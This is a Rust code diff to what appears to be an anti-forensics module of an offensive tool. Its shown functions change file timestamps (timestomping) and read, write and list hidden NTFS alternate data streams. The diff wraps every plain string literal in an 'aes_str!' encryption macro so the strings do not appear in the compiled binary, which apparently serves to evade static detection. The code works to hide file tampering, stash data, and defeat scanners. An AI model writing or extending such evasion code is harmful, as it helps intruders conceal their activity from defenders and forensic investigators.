@@ -8,6 +8,8 @@
 use std::fs;
 use std::path::Path;
 use rand::RngCore;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 // ── Timestomping ───────────────────────────────────────────────────────
 
@@ -94,7 +96,7 @@ fn set_file_times_win(
 
     unsafe {
         if SetFileTime(handle, c_ptr, a_ptr, m_ptr) == 0 {
-            return Err("SetFileTime failed".into());
+            return Err(aes_str!("SetFileTime failed"));
         }
     }
     Ok(())
@@ -116,7 +118,7 @@ fn set_file_times_unix(path: &str, accessed: std::time::SystemTime, modified: st
         Timespec { tv_sec: dur.as_secs() as i64, tv_nsec: dur.subsec_nanos() as i64 }
     }
 
-    let c_path = CString::new(path).map_err(|_| "Invalid path")?;
+    let c_path = CString::new(path).map_err(|_| aes_str!("Invalid path"))?;
     let times = [systime_to_timespec(accessed), systime_to_timespec(modified)];
 
     unsafe {
@@ -249,7 +251,7 @@ pub fn ads_write(file_path: &str, stream_name: &str, data: &[u8]) -> Result<Stri
     #[cfg(not(target_os = "windows"))]
     {
         let _ = (file_path, stream_name, data);
-        Err("ADS is NTFS/Windows-only".into())
+        Err(aes_str!("ADS is NTFS/Windows-only"))
     }
 }
 
@@ -264,7 +266,7 @@ pub fn ads_read(file_path: &str, stream_name: &str) -> Result<Vec<u8>, String> {
     #[cfg(not(target_os = "windows"))]
     {
         let _ = (file_path, stream_name);
-        Err("ADS is NTFS/Windows-only".into())
+        Err(aes_str!("ADS is NTFS/Windows-only"))
     }
 }
 
@@ -301,7 +303,7 @@ pub fn ads_list(file_path: &str) -> Result<Vec<String>, String> {
                 let name_len = data.stream_name.iter().position(|&c| c == 0).unwrap_or(296);
                 let name = String::from_utf16_lossy(&data.stream_name[..name_len]);
                 // Skip the default ::$DATA stream
-                if name != "::$DATA" {
+                if name != aes_str!("::$DATA") {
                     streams.push(format!("{} ({} bytes)", name, data.stream_size));
                 }
 
@@ -317,7 +319,7 @@ pub fn ads_list(file_path: &str) -> Result<Vec<String>, String> {
     #[cfg(not(target_os = "windows"))]
     {
         let _ = file_path;
-        Err("ADS is NTFS/Windows-only".into())
+        Err(aes_str!("ADS is NTFS/Windows-only"))
     }
 }
 
